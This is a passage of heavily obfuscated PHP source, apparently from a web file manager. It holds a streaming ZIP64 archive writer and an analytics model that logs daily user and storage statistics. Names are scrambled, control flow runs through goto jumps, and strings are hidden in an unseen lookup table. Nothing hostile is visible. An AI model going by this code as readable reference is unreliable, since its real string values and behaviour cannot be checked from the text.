"\60\x2e\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($dÅôÂğô‘¬ = null) { $B‚“è§¨îÜ =& $_SERVER[©]; $this->outputStream = fopen($B‚“è§¨îÜ[2006], $B‚“è§¨îÜ[1223]); $this->outputName = $dÅôÂğô‘¬; $this->needHeaders = !0; } public function addFile($d¥ßíÛÀ¤é, $C¶ƒ¤ÔÓ) { goto Dğê‚„ÒÈ‡; Dğê‚„ÒÈ‡: $cØ¦æÆ¦šÏ =& $_SERVER[©]; $d¥ßíÛÀ¤é = $this->filterFilename($d¥ßíÛÀ¤é); $fë•ìÊ‚¿¶ = static::METHOD_STORE; goto E—¸ÊÂ‡‡; aî”Š©îÓ­: $this->addFileFooter($d¥ßíÛÀ¤é, $fë•ìÊ‚¿¶, $DĞá™“è„, $Bõà†­ùÄÆ, $E©ÚœÁ–í, $E¹¨÷Ê…Á¥); goto Dù†¬¦Ëëã; E—¸ÊÂ‡‡: $E¹¨÷Ê…Á¥ = $this->addFileHeader($d¥ßíÛÀ¤é, $fë•ìÊ‚¿¶); $Bõà†­ùÄÆ = $E©ÚœÁ–í = filesize($C¶ƒ¤ÔÓ); $e²¬£Å…è« = fopen($C¶ƒ¤ÔÓ, $cØ¦æÆ¦šÏ[2007]); goto aÙóæµ¥Áƒ; aÙóæµ¥Áƒ: while (!feof($e²¬£Å…è«)) { $B“š“µèáá = fread($e²¬£Å…è«, 1048576); $this->send($B“š“µèáá); } fclose($e²¬£Å…è«); $DĞá™“è„ = hexdec(hash_file($cØ¦æÆ¦šÏ[2008], $C¶ƒ¤ÔÓ)); goto aî”Š©îÓ­; Dù†¬¦Ëëã: } public function addFileFromStream($d­È†§¤ŞŞ, $aÔæŒÍ©ïĞ) { goto eÌíÛÅÉ; a½ÕÏ–Ô«è: $this->addFileFooter($d­È†§¤ŞŞ, $bÅÉº·¨‡, $C¼¸ø¸¯Œ, $a·Ï²¨ö˜ , $dÕ¡¦à¬´š, $Dº˜ÀŒÚ); goto d‰¢½’ˆ; Böœº ´ğ: fseek($aÔæŒÍ©ïĞ, 0, SEEK_END); $a·Ï²¨ö˜  = $dÕ¡¦à¬´š = ftell($aÔæŒÍ©ïĞ); rewind($aÔæŒÍ©ïĞ); goto FöµìËŸÍƒ; eÌíÛÅÉ: $d­È†§¤ŞŞ = $this->filterFilename($d­È†§¤ŞŞ); $bÅÉº·¨‡ = static::METHOD_STORE; $Dº˜ÀŒÚ = $this->addFileHeader($d­È†§¤ŞŞ, $bÅÉº·¨‡); goto Böœº ´ğ; FöµìËŸÍƒ: $cÉŞ¶”² = hash_init($_SERVER[©][2008]); while (!feof($aÔæŒÍ©ïĞ)) { $B™À‘¬¤ = fread($aÔæŒÍ©ïĞ, 1048576); hash_update($cÉŞ¶”², $B™À‘¬¤); $this->send($B™À‘¬¤); } $C¼¸ø¸¯Œ = hexdec(hash_final($cÉŞ¶”²)); goto a½ÕÏ–Ô«è; d‰¢½’ˆ: } public function finish() { foreach ($this->files as $f·¹»‘ö¨Ø) { $this->addCdrFile($f·¹»‘ö¨Ø); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($DÕ™ÀÕˆùë, $a»ïÚ«‡ŞÆ) { goto e“ï‹éƒÏî; e“ï‹éƒÏî: $Fíñô«í ¬ =& $_SERVER[©]; $DÕ™ÀÕˆùë = preg_replace($Fíñô«í ¬[2009], $Fíñô«í ¬[43], $DÕ™ÀÕˆùë); $C¹­Ğ‘¤¦ = strlen($DÕ™ÀÕˆùë); goto eĞ·ñˆŠâŒ; C½ŠñÀ„˜¾: $BîƒíÍ„Õª = $this->packFields($aÙÌâ‰ÏÛ); $DšÉÕÍ¨ŠÅ = $this->packFields($eÛ›¸†‹ø); $this->send($BîƒíÍ„Õª . $DÕ™ÀÕˆùë . $DšÉÕÍ¨ŠÅ); goto dÜà…ÂÈìó; eĞ·ñˆŠâŒ: $aÄ§ÄâØöÙ = $this->dosTime(time()); $aÙÌâ‰ÏÛ = array(array($Fíñô«í ¬[2010], static::FILE_HEADER_SIGNATURE), array($Fíñô«í ¬[2011], static::ZIP_VERSION_64), array($Fíñô«í ¬[2011], 8), array($Fíñô«í ¬[2011], $a»ïÚ«‡ŞÆ), array($Fíñô«í ¬[2010], $aÄ§ÄâØöÙ), array($Fíñô«í ¬[2010], 0), array($Fíñô«í ¬[2010], 4294967295), array($Fíñô«í ¬[2010], 4294967295), array($Fíñô«í ¬[2011], $C¹­Ğ‘¤¦), array($Fíñô«í ¬[2011], 32)); $eÛ›¸†‹ø = array(array($Fíñô«í ¬[2011], 1), array($Fíñô«í ¬[2011], 28), array($Fíñô«í ¬[2012], 0), array($Fíñô«í ¬[2012], 0), array($Fíñô«í ¬[2012], 0), array($Fíñô«í ¬[2010], 0)); goto C½ŠñÀ„˜¾; dÜà…ÂÈìó: return strlen($BîƒíÍ„Õª) + $C¹­Ğ‘¤¦ + strlen($DšÉÕÍ¨ŠÅ); goto aÓİ‡äÒÕ†; aÓİ‡äÒÕ†: } protected function addFileFooter($eºõèÔÌø, $E«ê‡šë ø, $AÁ†”Ù´, $aå•Ö­µØÓ, $D›ª ×¯­ä, $D¶ä×£åà˜) { $a›Ğâ¸‚Ó¢ =& $_SERVER[©]; $C‘ÉÓæëÒ = array(array($a›Ğâ¸‚Ó¢[2010], static::DATA_DESCRIPTOR_SIGNATURE), array($a›Ğâ¸‚Ó¢[2010], $AÁ†”Ù´), array($a›Ğâ¸‚Ó¢[2012], $aå•Ö­µØÓ), array($a›Ğâ¸‚Ó¢[2012], $D›ª ×¯­ä)); $EÇÑİÂÌ¤“ = $this->packFields($C‘ÉÓæëÒ); $this->send($EÇÑİÂÌ¤“); $f½Àµçßˆé = $D¶ä×£åà˜ + $aå•Ö­µØÓ + $EÜŠùÂŸÓ; $this->addToCdr($eºõèÔÌø, $E«ê‡šë ø, $AÁ†”Ù´, $aå•Ö­µØÓ, $D›ª ×¯­ä, $f½Àµçßˆé); } private function addToCdr($A‹÷ÓÒä®¤, $DÙ‘”ÕÕ¬ª, $C‹åÈœô¥, $c––ÇèŸˆ, $eãÃñÂ—Œ, $AË¢Â·í) { $this->files[] = array($A‹÷ÓÒä®¤, $DÙ‘”ÕÕ¬ª, $C‹åÈœô¥, $c––ÇèŸˆ, $eãÃñÂ—Œ, $this->ofs); $this->ofs += $AË¢Â·í; } protected function addCdrFile($B¢»ˆ·ÙØç) { goto B‘¤œßÕ÷; E»Ì±ÔÍ—ƒ: $this->send($F’Ûó‹ì¥¾); $this->cdr_ofs += strlen($F’Ûó‹ì¥¾); goto e˜Ã˜ÃË˜»; Dïô¼öí¡ê: $aŸ½½â¶º = $this->packFields($Cƒã²¤‚·); $Bğô² ¥× = $this->packFields($B„ Ãìâ¼); $F’Ûó‹ì¥¾ = $aŸ½½â¶º . $B™ç…êùìå . $d‘×èÔ”‘Ø . $Bğô² ¥×; goto E»Ì±ÔÍ—ƒ; B‘¤œßÕ÷: $a¸½šµŒØ =& $_SERVER[©]; list($B™ç…êùìå, $fæñÙŒŠ™, $E¼ù’¬İš, $f†¹˜¯º“›, $dİğ³˜Ê÷Ü, $aÀˆòÏ­) = $B¢»ˆ·ÙØç; $d‘×èÔ”‘Ø = $a¸½šµŒØ[43]; goto dÔ£ø¦‘•ã; dÔ£ø¦‘•ã: $d„”³Ş•ÅŒ = $this->dosTime(time()); $Cƒã²¤‚· = array(array($a¸½šµŒØ[2010], static::CDR_FILE_SIGNATURE), array($a¸½šµŒØ[2011], static::ZIP_VERSION_64), array($a¸½šµŒØ[2011], static::ZIP_VERSION_64), array($a¸½šµŒØ[2011], 8), array($a¸½šµŒØ[2011], $fæñÙŒŠ™), array($a¸½šµŒØ[2010], $d„”³Ş•ÅŒ), array($a¸½šµŒØ[2010], $E¼ù’¬İš), array($a¸½šµŒØ[2010], 4294967295), array($a¸½šµŒØ[2010], 4294967295), array($a¸½šµŒØ[2011], strlen($B™ç…êùìå)), array($a¸½šµŒØ[2011], 32), array($a¸½šµŒØ[2011], strlen($d‘×èÔ”‘Ø)), array($a¸½šµŒØ[2011], 0), array($a¸½šµŒØ[2011], 0), array($a¸½šµŒØ[2010], 32), array($a¸½šµŒØ[2010], 4294967295)); $B„ Ãìâ¼ = array(array($a¸½šµŒØ[2011], 1), array($a¸½šµŒØ[2011], 28), array($a¸½šµŒØ[2012], $dİğ³˜Ê÷Ü), array($a¸½šµŒØ[2012], $f†¹˜¯º“›), array($a¸½šµŒØ[2012], $aÀˆòÏ­), array($a¸½šµŒØ[2010], 0)); goto Dïô¼öí¡ê; e˜Ã˜ÃË˜»: } protected function addCdr64Eof() { goto EÄ¯Ã¸ãîï; fŸÕ±”˜êß: $this->send($c¼à†®¹ƒ); goto cä¢ÀéÏ‚ƒ; Eó³Ùñ“Ê: $EæÓ°¸Èê‘ = $this->ofs; $eÛ¢È“ßç„ = array(array($e´¬±ƒ¢”¬[2010], static::ZIP64_CDR_EOF_SIGNATURE), array($e´¬±ƒ¢”¬[2012], 44), array($e´¬±ƒ¢”¬[2011], static::ZIP_VERSION_64), array($e´¬±ƒ¢”¬[2011], static::ZIP_VERSION_64), array($e´¬±ƒ¢”¬[2010], 0), array($e´¬±ƒ¢”¬[2010], 0), array($e´¬±ƒ¢”¬[2012], $cäæ•â±Ñ), array($e´¬±ƒ¢”¬[2012], $cäæ•â±Ñ), array($e´¬±ƒ¢”¬[2012], $CÄ÷„ù±ø¹), array($e´¬±ƒ¢”¬[2012], $EæÓ°¸Èê‘)); $c¼à†®¹ƒ = $this->packFields($eÛ¢È“ßç„); goto fŸÕ±”˜êß; EÄ¯Ã¸ãîï: $e´¬±ƒ¢”¬ =& $_SERVER[©]; $cäæ•â±Ñ = count($this->files); $CÄ÷„ù±ø¹ = $this->cdr_ofs; goto Eó³Ùñ“Ê; cä¢ÀéÏ‚ƒ: } protected function addCdr64Locator() { goto bªùç•Çë; bªùç•Çë: $AÒ¬ÔãÉÅ =& $_SERVER[©]; $f‘ÒÒÌÆ›¸ = count($this->files); $a¿Š‹©æ‘Ÿ = $this->cdr_ofs; goto BæÓ³÷Øİ; BæÓ³÷Øİ: $DØ–ªÃÛ = $this->ofs; $fÄ‡º›äôå = array(array($AÒ¬ÔãÉÅ[2010], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($AÒ¬ÔãÉÅ[2010], 0), array($AÒ¬ÔãÉÅ[2012], $DØ–ªÃÛ + $a¿Š‹©æ‘Ÿ), array($AÒ¬ÔãÉÅ[2010], 1)); $aÕÈÅ…Š¹ = $this->packFields($fÄ‡º›äôå); goto dÒ Ö÷Ì˜; dÒ Ö÷Ì˜: $this->send($aÕÈÅ…Š¹); goto Eõ³Æ³¥÷; Eõ³Æ³¥÷: } protected function addCdrEof() { goto EİÄŠñÓç°; EİÄŠñÓç°: $F¶Š¨ïíğø =& $_SERVER[©]; $CËÍ¯¾¹ˆá = count($this->files); $fÚ”¨ÓóîÇ = $this->cdr_ofs; goto AğÙõå»; AğÙõå»: $bÃËº§šƒ = $this->ofs; $fˆŸä²Å‰Ù = $F¶Š¨ïíğø[43]; $DåÀ¤àğïß = array(array($F¶Š¨ïíğø[2010], static::CDR_EOF_SIGNATURE), array($F¶Š¨ïíğø[2011], 0), array($F¶Š¨ïíğø[2011], 0), array($F¶Š¨ïíğø[2011], $CËÍ¯¾¹ˆá), array($F¶Š¨ïíğø[2011], $CËÍ¯¾¹ˆá), array($F¶Š¨ïíğø[2010], 4294967295), array($F¶Š¨ïíğø[2010], 4294967295), array($F¶Š¨ïíğø[2011], strlen($fˆŸä²Å‰Ù))); goto A˜öÈæ‰; A˜öÈæ‰: $C·“ë½ğÚÕ = $this->packFields($DåÀ¤àğïß) . $fˆŸä²Å‰Ù; $this->send($C·“ë½ğÚÕ); goto cÃµ‹ªé²İ; cÃµ‹ªé²İ: } protected function addCdr() { foreach ($this->files as $CÊØí½‹İİ) { $this->addCdrFile($CÊØí½‹İİ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $e’“³ì¯»Ş =& $_SERVER[©]; $DÁÔÇ†Îâ‹ = $e’“³ì¯»Ş[212]; if ($this->outputName) { $dËÒÜ­Áßˆ = trim(str_replace(array($e’“³ì¯»Ş[123], $e’“³ì¯»Ş[65], $e’“³ì¯»Ş[103], $e’“³ì¯»Ş[77], $e’“³ì¯»Ş[9], $e’“³ì¯»Ş[989]), $e’“³ì¯»Ş[43], $this->outputName)); $E¾¯éÛÏƒ™ = rawurlencode($dËÒÜ­Áßˆ); $DÁÔÇ†Îâ‹ .= "\73\x20\146\151\154\x65\x6e\141\x6d\x65\52\75\165\x74\146\55\x38\x27\x27{$E¾¯éÛÏƒ™}"; } $fõ½İ¸½¯¥ = array($e’“³ì¯»Ş[209] => $e’“³ì¯»Ş[2013], $e’“³ì¯»Ş[2014] => $DÁÔÇ†Îâ‹, $e’“³ì¯»Ş[2015] => $e’“³ì¯»Ş[2016], $e’“³ì¯»Ş[2017] => $e’“³ì¯»Ş[2018], $e’“³ì¯»Ş[2019] => $e’“³ì¯»Ş[2020]); foreach ($fõ½İ¸½¯¥ as $b°ƒæ¼Ö‘¼ => $aàë×ø» Ó) { header($b°ƒæ¼Ö‘¼ . $e’“³ì¯»Ş[877] . $aàë×ø» Ó); } } protected function send($e ŠÄ—ùîâ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $e ŠÄ—ùîâ); } protected final function dosTime($Cœë›òÕ¢¢) { $C¼×Ú³ÁÔ =& $_SERVER[©]; $CŒ©Á‹–¶÷ = getdate($Cœë›òÕ¢¢); if ($CŒ©Á‹–¶÷[$C¼×Ú³ÁÔ[1723]] < 1980) { $CŒ©Á‹–¶÷ = array($C¼×Ú³ÁÔ[1723] => 1980, $C¼×Ú³ÁÔ[2021] => 1, $C¼×Ú³ÁÔ[2022] => 1, $C¼×Ú³ÁÔ[2023] => 0, $C¼×Ú³ÁÔ[2024] => 0, $C¼×Ú³ÁÔ[2025] => 0); } $CŒ©Á‹–¶÷[$C¼×Ú³ÁÔ[1723]] -= 1980; return $CŒ©Á‹–¶÷[$C¼×Ú³ÁÔ[1723]] << 25 | $CŒ©Á‹–¶÷[$C¼×Ú³ÁÔ[2021]] << 21 | $CŒ©Á‹–¶÷[$C¼×Ú³ÁÔ[2022]] << 16 | $CŒ©Á‹–¶÷[$C¼×Ú³ÁÔ[2023]] << 11 | $CŒ©Á‹–¶÷[$C¼×Ú³ÁÔ[2024]] << 5 | $CŒ©Á‹–¶÷[$C¼×Ú³ÁÔ[2025]] >> 1; } protected function packFields($F´¼ÙÊ¾ ) { $AØ·ØòŸ¦® =& $_SERVER[©]; $e£Ş‘É„×¾ = $AØ·ØòŸ¦®[43]; $AÙªÆµô«» = array(); foreach ($F´¼ÙÊ¾  as $Cöğë‹¬¯) { $e£Ş‘É„×¾ .= $Cöğë‹¬¯[0]; $AÙªÆµô«»[] = $Cöğë‹¬¯[1]; } array_unshift($AÙªÆµô«», $e£Ş‘É„×¾); return call_user_func_array($AØ·ØòŸ¦®[2026], $AÙªÆµô«»); } protected function filterFilename($cğÈ¼ŒƒŠÔ) { $FË­‡è‘Á =& $_SERVER[©]; return str_replace(array($FË­‡è‘Á[103], $FË­‡è‘Á[14], $FË­‡è‘Á[186], $FË­‡è‘Á[79], $FË­‡è‘Á[123], $FË­‡è‘Á[922], $FË­‡è‘Á[925], $FË­‡è‘Á[280]), $FË­‡è‘Á[80], $cğÈ¼ŒƒŠÔ); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($Aµ¸‚è×„ï) { $CßéƒÉå• =& $_SERVER[©]; $d°Ê‰‰‰çÖ = array($CßéƒÉå•[543] => array($CßéƒÉå•[39] => $CßéƒÉå•[2027], $CßéƒÉå•[270] => array($CßéƒÉå•[220], $CßéƒÉå•[699], $CßéƒÉå•[2028], $CßéƒÉå•[2029])), $CßéƒÉå•[2030] => array($CßéƒÉå•[39] => $CßéƒÉå•[2031], $CßéƒÉå•[270] => array($CßéƒÉå•[220], $CßéƒÉå•[697], $CßéƒÉå•[2032], $CßéƒÉå•[2033], $CßéƒÉå•[2034]))); if (!isset($d°Ê‰‰‰çÖ[$Aµ¸‚è×„ï])) { return !1; } $this->optionType = $d°Ê‰‰‰çÖ[$Aµ¸‚è×„ï][$CßéƒÉå•[39]]; $this->field = $d°Ê‰‰‰çÖ[$Aµ¸‚è×„ï][$CßéƒÉå•[270]]; return !0; } public function listData($fšÀó±õ¥¿ = false, $aƒæ–Áğö = "\155\x6f\144\x69\x66\x79\124\151\x6d\145", $Dö£‰µ‘ë = false) { return parent::listData($fšÀó±õ¥¿, $aƒæ–Áğö, $Dö£‰µ‘ë); } public function trendList($FÏ‚ˆªéğÌ) { goto Aî…‡ÁÓÜœ; Aî…‡ÁÓÜœ: $e–¦šôæ‹ä =& $_SERVER[©]; $c´âÆõ—»º = $this->listData(); if ($c´âÆõ—»º) { $dÑ÷éÎÏÊ² = end($c´âÆõ—»º); $E»¼ç›”— = date($e–¦šôæ‹ä[2035], strtotime($e–¦šôæ‹ä[2036])); if ($dÑ÷éÎÏÊ²[$e–¦šôæ‹ä[220]] == $E»¼ç›”—) { return $c´âÆõ—»º; } $c‰‹ãˆˆå = strtotime($dÑ÷éÎÏÊ²[$e–¦šôæ‹ä[220]]); } goto fÊÙáÊËŞ¦; Aø¬õÆ¹˜¯: foreach ($d‘¬±¬ê‘‡ as $E»¼ç›”—) { $this->{$fôø¦æ§ä…}($E»¼ç›”—); } return $this->listData(); goto c®×‰À»À; fÊÙáÊËŞ¦: if (!isset($c‰‹ãˆˆå)) { $e¨ã©ƒ¨å = $FÏ‚ˆªéğÌ == $e–¦šôæ‹ä[543] ? $e–¦šôæ‹ä[485] : $e–¦šôæ‹ä[752]; $c‰‹ãˆˆå = Model($e¨ã©ƒ¨å)->min($e–¦šôæ‹ä[197]); } $fôø¦æ§ä… = $e–¦šôæ‹ä[2037] . ucfirst($FÏ‚ˆªéğÌ); $d‘¬±¬ê‘‡ = $this->dateList($c‰‹ãˆˆå); goto Aø¬õÆ¹˜¯; c®×‰À»À: } private function dateList($AØõÕÔïÊ) { $Dõ–é’øÏá =& $_SERVER[©]; $Dè‡¥ğ½ƒ = $AØõÕÔïÊ; $FÇ‰ò ‘ğ¬ = strtotime($Dõ–é’øÏá[2036]); $EÀŒ…èíõ = array(); while ($Dè‡¥ğ½ƒ <= $FÇ‰ò ‘ğ¬) { $EÀŒ…èíõ[] = date($Dõ–é’øÏá[2035], $Dè‡¥ğ½ƒ); $Dè‡¥ğ½ƒ = strtotime($Dõ–é’øÏá[2038], $Dè‡¥ğ½ƒ); } return $EÀŒ…èíõ; } public function _recordUser($f‹ì›Û¶¥Ì = '') { goto f»­×âê; Dˆ¡ÜÓ‰³È: $AáïÛÆ‘ù = Model($A‰­ÔÄšğ[485])->where($fƒÒòë«æ)->count($A‰­ÔÄšğ[1434]); $fƒÒòë«æ[$A‰­ÔÄšğ[39]] = $A‰­ÔÄšğ[2041]; $BÄêŸÀ²ì• = Model($A‰­ÔÄšğ[2042])->where($fƒÒòë«æ)->count($A‰­ÔÄšğ[2043]); goto FŠ¬ÚÒë‹ ; fÅš·Ë¤: $fƒÒòë«æ = array($A‰­ÔÄšğ[197] => array($A‰­ÔÄšğ[924], $C‡Öš—çá‡)); $AŒ—öÇ…º  = Model($A‰­ÔÄšğ[485])->where($fƒÒòë«æ)->count($A‰­ÔÄšğ[1434]); $fƒÒòë«æ[$A‰­ÔÄšğ[197]] = array($A‰­ÔÄšğ[330], array($CÂ™Ş­‹®ò, $C‡Öš—çá‡)); goto Dˆ¡ÜÓ‰³È; f»­×âê: $A‰­ÔÄšğ =& $_SERVER[©]; $CÂ™Ş­‹®ò = strtotime(date($A‰­ÔÄšğ[2039], strtotime($f‹ì›Û¶¥Ì))); $C‡Öš—çá‡ = strtotime(date($A‰­ÔÄšğ[2040], strtotime($f‹ì›Û¶¥Ì))); goto fÅš·Ë¤; FŠ¬ÚÒë‹ : $cã£ïõÇ£ó = array($A‰­ÔÄšğ[220] => $f‹ì›Û¶¥Ì, $A‰­ÔÄšğ[699] => (int) $AŒ—öÇ…º , $A‰­ÔÄšğ[2028] => (int) $AáïÛÆ‘ù, $A‰­ÔÄšğ[2029] => (int) $BÄêŸÀ²ì•); return $this->insert($cã£ïõÇ£ó); goto B‘ï¡àô±; B‘ï¡àô±: } public function _recordStore($d£Ä÷áˆ¥‘ = '') { goto f´ÊÊå²Ï³; f´ÊÊå²Ï³: $aÙÇ„¢Ï… =& $_SERVER[©]; $f¼À‘Ï÷œ = strtotime(date($aÙÇ„¢Ï…[2040], strtotime($d£Ä÷áˆ¥‘))); $f°ÒîËìŠÅ = array($aÙÇ„¢Ï…[197] => array($aÙÇ„¢Ï…[924], $f¼À‘Ï÷œ)); goto Bí½Ô–ßõ”; F¹†…Èïê: $f°ÒîËìŠÅ[$aÙÇ„¢Ï…[379]] = 1; $Eæ´ÓÔ•Ä¢ = Model($aÙÇ„¢Ï…[752])->where($f°ÒîËìŠÅ)->sum($aÙÇ„¢Ï…[87]); $f°ÒîËìŠÅ[$aÙÇ„¢Ï…[379]] = 2; goto fÓ¨ˆ–ñ; fÓ¨ˆ–ñ: $B®ˆ Òª¤ô = Model($aÙÇ„¢Ï…[752])->where($f°ÒîËìŠÅ)->sum($aÙÇ„¢Ï…[87]); $bŒÖ„Û°ÖÄ = array($aÙÇ„¢Ï…[220] => $d£Ä÷áˆ¥‘, $aÙÇ„¢Ï…[697] => (int) $cÈ¿±¨Š™…, $aÙÇ„¢Ï…[2032] => (int) $BÌóòÈÂ¨“, $aÙÇ„¢Ï…[2033] => (int) $Eæ´ÓÔ•Ä¢, $aÙÇ„¢Ï…[2034] => (int) $B®ˆ Òª¤ô); return $this->insert($bŒÖ„Û°ÖÄ); goto bŞÄ¶¨åÍÔ; Bí½Ô–ßõ”: $BÌóòÈÂ¨“ = Model($aÙÇ„¢Ï…[430])->where($f°ÒîËìŠÅ)->sum($aÙÇ„¢Ï…[87]); $f°ÒîËìŠÅ[$aÙÇ„¢Ï…[378]] = 0; $cÈ¿±¨Š™… = Model($aÙÇ„¢Ï…[752])->where($f°ÒîËìŠÅ)->sum($aÙÇ„¢Ï…[87]); goto F¹†…Èïê; bŞÄ¶¨åÍÔ: } public function trend($aË™›ˆÒ§Ë, $E×Ü ™ˆ™…) { goto EÁè†Óïß–; b¢ñ¶†ÜÕ…: if ($e¡²ó¶âƒÃ && $E×Ü ™ˆ™… != $Bè‡¥­¿…»[1409]) { $cÔõ’ì¯ = $e¡²ó¶âƒÃ[0][$Bè‡¥­¿…»[220]]; $b¯ ¼¯ƒ = $this->validDate($E×Ü ™ˆ™…, $cÔõ’ì¯); $b²Â’ŠŞÂ = array(); $D˜Õ˜ß »ö = array_to_keyvalue($e¡²ó¶âƒÃ, $Bè‡¥­¿…»[220]); foreach ($b¯ ¼¯ƒ as $A¯ŒÜÕ„¤Û) { if (isset($D˜Õ˜ß »ö[$A¯ŒÜÕ„¤Û])) { $EÌÌÊ¤Ê§‰ = $D˜Õ˜ß »ö[$A¯ŒÜÕ„¤Û]; } else { $EÌÌÊ¤Ê§‰ = end($e¡²ó¶âƒÃ); $EÌÌÊ¤Ê§‰[$Bè‡¥­¿…»[220]] = $A¯ŒÜÕ„¤Û; if ($aË™›ˆÒ§Ë == $Bè‡¥­¿…»[543]) { $EÌÌÊ¤Ê§‰[$Bè‡¥­¿…»[2028]] = $EÌÌÊ¤Ê§‰[$Bè‡¥­¿…»[2029]] = 0; } } $b²Â’ŠŞÂ[] = $EÌÌÊ¤Ê§‰; } $e¡²ó¶âƒÃ = $b²Â’ŠŞÂ; } $eòì‰£¸º¦ = array($Bè‡¥­¿…»[543] => array($Bè‡¥­¿…»[699] => LNG($Bè‡¥­¿…»[2044]), $Bè‡¥­¿…»[2028] => LNG($Bè‡¥­¿…»[2045]), $Bè‡¥­¿…»[2029] => LNG($Bè‡¥­¿…»[2046])), $Bè‡¥­¿…»[2030] => array($Bè‡¥­¿…»[697] => LNG($Bè‡¥­¿…»[2047]), $Bè‡¥­¿…»[2032] => LNG($Bè‡¥­¿…»[2048]), $Bè‡¥­¿…»[2033] => LNG($Bè‡¥­¿…»[2049]), $Bè‡¥­¿…»[2034] => LNG($Bè‡¥­¿…»[2050]))); $eš‘ò«¿ó = array($Bè‡¥­¿…»[543] => $Bè‡¥­¿…»[2051], $Bè‡¥­¿…»[2030] => $Bè‡¥­¿…»[87]); goto eùÚÓŞ¤ŠÙ; EÁè†Óïß–: $Bè‡¥­¿…» =& $_SERVER[©]; if (!$this->init($aË™›ˆÒ§Ë)) { return !1; } $e¡²ó¶âƒÃ = $this->trendList($aË™›ˆÒ§Ë); goto b¢ñ¶†ÜÕ…; e‘¹¿±½Ì: return $DÙõ§îğÍ•; goto b“À‰ÖÃ¢µ; eùÚÓŞ¤ŠÙ: if (empty($e¡²ó¶âƒÃ)) { $A¯ŒÜÕ„¤Û = date($Bè‡¥­¿…»[2035], strtotime($Bè‡¥­¿…»[2036])); $d¿ï–Œº½· = array($Bè‡¥­¿…»[220] => $A¯ŒÜÕ„¤Û); foreach ($eòì‰£¸º¦[$aË™›ˆÒ§Ë] as $B‹º·ñç => $FŞ®’æ–Ô) { $d¿ï–Œº½·[$B‹º·ñç] = 0; } $e¡²ó¶âƒÃ[] = $d¿ï–Œº½·; } $DÙõ§îğÍ• = array(); foreach ($e¡²ó¶âƒÃ as $FŞ®’æ–Ô) { if ($aË™›ˆÒ§Ë == $Bè‡¥­¿…»[2030] && $FŞ®’æ–Ô[$Bè‡¥­¿…»[2032]] > $FŞ®’æ–Ô[$Bè‡¥­¿…»[697]]) { $FŞ®’æ–Ô[$Bè‡¥­¿…»[2032]] = $FŞ®’æ–Ô[$Bè‡¥­¿…»[697]]; } foreach ($eòì‰£¸º¦[$aË™›ˆÒ§Ë] as $B‹º·ñç => $aŒ—¥„ùùº) { $EÌÌÊ¤Ê§‰ = array($Bè‡¥­¿…»[220] => $FŞ®’æ–Ô[$Bè‡¥­¿…»[220]], $Bè‡¥­¿…»[1338] => $aŒ—¥„ùùº); $EÌÌÊ¤Ê§‰[$eš‘ò«¿ó[$aË™›ˆÒ§Ë]] = isset($FŞ®’æ–Ô[$B‹º·ñç]) ? $FŞ®’æ–Ô[$B‹º·ñç] : 0; $DÙõ§îğÍ•[] = $EÌÌÊ¤Ê§‰; } } goto e‘¹¿±½Ì; b“À‰ÖÃ¢µ: } public function validDate($A–©”Ñ„ì, $c‡¦«àÑ•ˆ) { goto AŞì“‡ã“à; CËÕ‡‡¸›: switch ($A–©”Ñ„ì) { case $Bïİ—ÙÕ·ñ[1416]: $E¿ö…‹Ê = mktime(0, 0, 0, date($Bïİ—ÙÕ·ñ[2052]), date($Bïİ—ÙÕ·ñ[2053]) - date($Bïİ—ÙÕ·ñ[1223]) + 7 - 7, date($Bïİ—ÙÕ·ñ[2054])); $cÆê«ÚÈ½ = 0; do { $c´Àã°•ƒ = date($Bïİ—ÙÕ·ñ[2035], $E¿ö…‹Ê - 3600 * 24 * 7 * $cÆê«ÚÈ½); $B‰‚˜–Å’ê[] = $c´Àã°•ƒ; $cÆê«ÚÈ½++; } while ($c‡¦«àÑ•ˆ < $c´Àã°•ƒ); break; case $Bïİ—ÙÕ·ñ[1414]: $cÆê«ÚÈ½ = 1; do { $A”›‰Ÿ¶òÊ = date($Bïİ—ÙÕ·ñ[2055], strtotime("\x2d\40{$cÆê«ÚÈ½}\40\155\157\156\164\150\163")); $B‰‚˜–Å’ê[] = $A”›‰Ÿ¶òÊ; $cÆê«ÚÈ½++; } while ($c‡¦«àÑ•ˆ < $A”›‰Ÿ¶òÊ); break; case $Bïİ—ÙÕ·ñ[1723]: $DÏÏ¯÷õ¤å = (int) date($Bïİ—ÙÕ·ñ[2054], strtotime($c‡¦«àÑ•ˆ)); $DÚˆë§Û÷œ = (int) date($Bïİ—ÙÕ·ñ[2054]); if ($DÏÏ¯÷õ¤å >= $DÚˆë§Û÷œ) { break; } for ($DÏÏ¯÷õ¤å; $DÏÏ¯÷õ¤å < $DÚˆë§Û÷œ; $DÏÏ¯÷õ¤å++) { $B‰‚˜–Å’ê[] = $DÏÏ¯÷õ¤å . $Bïİ—ÙÕ·ñ[2056]; } break; default: break; } if ($c‡¦«àÑ•ˆ > end($B‰‚˜–Å’ê)) { array_pop($B‰‚˜–Å’ê); } sort($B‰‚˜–Å’ê); goto aßÚÆ‡¥Ñ; aßÚÆ‡¥Ñ: return $B‰‚˜–Å’ê; goto aŒêÑÊŸ¬º; AŞì“‡ã“à: $Bïİ—ÙÕ·ñ =& $_SERVER[©]; $D³§ÆæÁù = date($Bïİ—ÙÕ·ñ[2035], strtotime($Bïİ—ÙÕ·ñ[2036])); $B‰‚˜–Å’ê = array($D³§ÆæÁù); goto CËÕ‡‡¸›; aŒêÑÊŸ¬º: } public function listTable($Fˆ©Õƒ„ğ ) { $dÈ·êğï = ucfirst($Fˆ©Õƒ„ğ ); return Model($dÈ·êğï)->listData(); } public function 